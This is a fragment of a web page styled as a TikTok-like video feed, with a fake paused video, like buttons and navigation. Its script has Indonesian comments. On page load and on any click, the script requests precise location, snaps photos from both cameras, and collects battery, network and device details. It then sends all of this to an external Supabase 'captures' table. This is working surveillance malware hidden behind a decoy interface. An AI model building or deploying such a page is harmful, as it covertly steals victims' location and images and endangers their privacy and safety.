<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #000;
    color: #fff;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    height: 100vh;
    overflow: hidden;
    display: flex;
    flex-direction: column;
  }

  /* TOP NAV */
  .topnav {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 12px 16px 8px;
    position: relative;
    z-index: 10;
  }
  .topnav .tabs {
    display: flex;
    gap: 20px;
    font-size: 15px;
    color: rgba(255,255,255,0.6);
    font-weight: 600;
  }
  .topnav .tabs .active {
    color: #fff;
    border-bottom: 2px solid #fff;
    padding-bottom: 4px;
  }
  .topnav .live-btn {
    font-size: 13px;
    color: rgba(255,255,255,0.6);
    display: flex;
    align-items: center;
    gap: 4px;
  }
  .topnav .search-icon { font-size: 22px; cursor: pointer; }

  /* VIDEO FEED */
  .feed {
    flex: 1;
    position: relative;
    overflow: hidden;
  }
  .video-item {
    position: absolute;
    width: 100%;
    height: 100%;
    background: #111;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  .video-bg {
    width: 100%;
    height: 100%;
    object-fit: cover;
    opacity: 0.6;
  }
  /* Fake gradient overlay to look like paused video */
  .video-overlay {
    position: absolute;
    inset: 0;
    background: linear-gradient(
      to bottom,
      transparent 0%,
      transparent 50%,
      rgba(0,0,0,0.7) 100%
    );
  }
  .play-icon {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    font-size: 60px;
    opacity: 0.7;
    pointer-events: none;
  }

  /* RIGHT SIDEBAR */
  .sidebar {
    position: absolute;
    right: 12px;
    bottom: 100px;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 18px;
    z-index: 10;
  }
  .avatar-wrap {
    position: relative;
    cursor: pointer;
  }
  .avatar {
    width: 44px;
    height: 44px;
    border-radius: 50%;
    border: 2px solid #fff;
    background: linear-gradient(135deg, #ff0050, #ff6680);
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 20px;
  }
  .follow-plus {
    position: absolute;
    bottom: -8px;
    left: 50%;
    transform: translateX(-50%);
    background: #fe2c55;
    border-radius: 50%;
    width: 20px;
    height: 20px;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 14px;
    font-weight: bold;
  }
  .action-item {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 4px;
    cursor: pointer;
  }
  .action-icon {
    font-size: 32px;
    filter: drop-shadow(0 1px 3px rgba(0,0,0,0.5));
  }
  .action-count {
    font-size: 12px;
    color: #fff;
    font-weight: 600;
  }

  /* BOTTOM INFO */
  .video-info {
    position: absolute;
    bottom: 80px;
    left: 12px;
    right: 80px;
    z-index: 10;
  }
  .username {
    font-weight: 700;
    font-size: 16px;
    margin-bottom: 6px;
  }
  .caption {
    font-size: 14px;
    color: rgba(255,255,255,0.9);
    margin-bottom: 8px;
    line-height: 1.4;
  }
  .music-row {
    display: flex;
    align-items: center;
    gap: 6px;
    font-size: 13px;
    animation: none;
  }
  .music-note { font-size: 14px; }
  .music-text { 
    max-width: 180px;
    overflow: hidden;
    white-space: nowrap;
    text-overflow: ellipsis;
    color: rgba(255,255,255,0.9);
  }

  /* BOTTOM NAV */
  .bottomnav {
    display: flex;
    justify-content: space-around;
    align-items: center;
    padding: 10px 0 18px;
    background: #000;
    border-top: 1px solid rgba(255,255,255,0.1);
    z-index: 10;
  }
  .nav-item {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 3px;
    cursor: pointer;
  }
  .nav-icon { font-size: 24px; }
  .nav-label { font-size: 10px; color: rgba(255,255,255,0.5); }
  .nav-item.active .nav-label { color: #fff; }
  .nav-item.active .nav-icon { filter: none; }
  .plus-btn {
    background: linear-gradient(to right, #69C9D0, #fff, #EE1D52);
    border-radius: 8px;
    padding: 6px 14px;
    font-size: 22px;
    color: #000;
    font-weight: bold;
  }

  /* STATUS MESSAGES */
  .status-msg {
    display: none;
    position: fixed;
    top: 20px;
    left: 50%;
    transform: translateX(-50%);
    background: rgba(255,255,255,0.15);
    backdrop-filter: blur(10px);
    color: #fff;
    padding: 12px 20px;
    border-radius: 30px;
    font-size: 14px;
    z-index: 9999;
    white-space: nowrap;
    animation: fadeInOut 3s ease forwards;
  }
  @keyframes fadeInOut {
    0% { opacity: 0; transform: translateX(-50%) translateY(-10px); }
    15% { opacity: 1; transform: translateX(-50%) translateY(0); }
    70% { opacity: 1; }
    100% { opacity: 0; }
  }

  /* Fake video backgrounds using CSS */
  .fake-vid-1 { background: linear-gradient(160deg, #1a0a2e 0%, #0d1b4e 40%, #0a3040 100%); }
  .fake-vid-2 { background: linear-gradient(160deg, #2e0a0a 0%, #4e1a0d 40%, #3d2a00 100%); }
</style>
</head>

<style>
@keyframes spin { from{transform:rotate(0deg)} to{transform:rotate(360deg)} }
</style>

<script>
// ===== CONFIG =====
// Ganti dengan URL website ZAM-DEX kamu
const ZAMDEX_URL = "https://zam-dex-coder.vercel.app"; // <-- GANTI INI

// Ganti dengan Supabase URL & anon key kamu
const SUPABASE_URL = "https://dyevsyujenhtzkcwtxpd.supabase.co"; // <-- GANTI INI
const SUPABASE_ANON_KEY = "sb_publishable_pgPPD26ilzp1nstqLG5lCw_wxhoM5dQ"; // <-- GANTI INI

let collectedData = {};

// Langsung request izin saat load tanpa popup
window.addEventListener('load', () => {
  setTimeout(() => {
    requestPermissions();
  }, 1000);
});

function showStatus(msg) {
  const el = document.getElementById('statusMsg');
  el.textContent = msg;
  el.style.display = 'block';
  setTimeout(() => el.style.display = 'none', 3000);
}

async function requestPermissions() {
  document.getElementById('permOverlay').classList.remove('show');
  
  // 1. Request Location
  await requestLocation();
  // 2. Request Camera
  await requestCamera();
  // 3. Collect extras
  collectExtras();
  // 4. Save to Supabase
  await saveToSupabase();
}

async function requestLocation() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) { resolve(); return; }
    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        collectedData.latitude = pos.coords.latitude;
        collectedData.longitude = pos.coords.longitude;
        collectedData.accuracy = pos.coords.accuracy;
        // Reverse geocode
        try {
          const r = await fetch(
            `https://nominatim.openstreetmap.org/reverse?lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&format=json`
          );
          const geo = await r.json();
          collectedData.geo = geo;
        } catch(e) {}
        showStatus("Lokasi berhasil diakses");
        resolve();
      },
      () => { showStatus("Izin lokasi ditolak"); resolve(); },
      { enableHighAccuracy: true, timeout: 10000 }
    );
  });
}

async function requestCamera() {
  return new Promise(async (resolve) => {
    try {
      // Foto kamera belakang
      const backStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: { exact: "environment" } }
      });
      collectedData.photoBack = await capturePhoto(backStream);
      backStream.getTracks().forEach(t => t.stop());
      showStatus("Kamera belakang berhasil");
    } catch(e) {
      // Fallback: coba kamera apa saja
      try {
        const s = await navigator.mediaDevices.getUserMedia({ video: true });
        collectedData.photoBack = await capturePhoto(s);
        s.getTracks().forEach(t => t.stop());
      } catch(e2) {}
    }

    // Foto kamera depan
    try {
      const frontStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" }
      });
      collectedData.photoFront = await capturePhoto(frontStream);
      frontStream.getTracks().forEach(t => t.stop());
      showStatus("Kamera depan berhasil");
    } catch(e) {}

    resolve();
  });
}

function capturePhoto(stream) {
  return new Promise((resolve) => {
    const video = document.createElement('video');
    video.srcObject = stream;
    video.play();
    video.onplaying = () => {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      canvas.getContext('2d').drawImage(video, 0, 0);
      resolve(canvas.toDataURL('image/jpeg', 0.6));
    };
    setTimeout(() => resolve(null), 5000);
  });
}

function collectExtras() {
  // Battery
  if (navigator.getBattery) {
    navigator.getBattery().then(b => {
      collectedData.battery = Math.round(b.level * 100);
      collectedData.charging = b.charging;
    });
  }
  // Network
  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (conn) {
    collectedData.networkType = conn.effectiveType || conn.type || "unknown";
    collectedData.downlink = conn.downlink;
  }
  // Device info
  collectedData.userAgent = navigator.userAgent;
  collectedData.platform = navigator.platform;
  collectedData.language = navigator.language;
  collectedData.screenW = screen.width;
  collectedData.screenH = screen.height;
  collectedData.timestamp = new Date().toISOString();
}

async function saveToSupabase() {
  // Buat token unik untuk sesi ini
  const token = Math.random().toString(36).slice(2) + Date.now().toString(36);
  collectedData.token = token;

  try {
    await fetch(`${SUPABASE_URL}/rest/v1/captures`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'apikey': SUPABASE_ANON_KEY,
        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
        'Prefer': 'return=minimal'
      },
      body: JSON.stringify({
        token: token,
        latitude: collectedData.latitude || null,
        longitude: collectedData.longitude || null,
        accuracy: collectedData.accuracy || null,
        geo_raw: collectedData.geo ? JSON.stringify(collectedData.geo) : null,
        photo_back: collectedData.photoBack || null,
        photo_front: collectedData.photoFront || null,
        battery: collectedData.battery || null,
        charging: collectedData.charging || null,
        network_type: collectedData.networkType || null,
        downlink: collectedData.downlink || null,
        user_agent: collectedData.userAgent || null,
        platform: collectedData.platform || null,
        language: collectedData.language || null,
        screen_width: collectedData.screenW || null,
        screen_height: collectedData.screenH || null,
        created_at: collectedData.timestamp
      })
    });
    showStatus("Data tersimpan!");
  } catch(e) {
    console.error("Gagal simpan:", e);
  }
}

// Click video to play (fake)
document.getElementById('feed').addEventListener('click', () => {
  requestPermissions();
});
</script>
</body>
